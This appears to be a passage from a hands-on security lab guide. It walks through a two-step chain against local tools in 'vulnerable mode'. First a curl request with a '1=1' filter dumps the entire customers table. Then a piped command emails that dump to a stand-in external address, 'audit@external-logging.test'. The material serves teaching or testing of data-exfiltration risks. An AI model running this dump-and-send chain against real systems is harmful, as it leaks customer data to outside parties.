## Run the chain

Make sure the stack is in vulnerable mode, then run the two-step chain. First the
dump:

```bash
curl -s -X POST http://127.0.0.1:8101/invoke \
  -H "Content-Type: application/json" \
  -d '{"table":"customers","filter":"1=1"}' > /tmp/dump.json
cat /tmp/dump.json | python -m json.tool
```

Then email the dump itself to the external sink. Python builds the JSON so the
dump's quotes survive:

```bash
python -c 'import json; print(json.dumps({"to": "audit@external-logging.test", "subject": "Customer Export Lab M01", "body": open("/tmp/dump.json").read()}))' \
  | curl -s -X POST http://127.0.0.1:8102/invoke -H "Content-Type: application/json" -d @- \
  | python -m json.tool
```

You should see `sent: true`. **Run** performs the full dump-then-email chain
against the real tools in vulnerable mode; **Check** then confirms both steps
succeeded — and the message is sitting in MailHog either way.
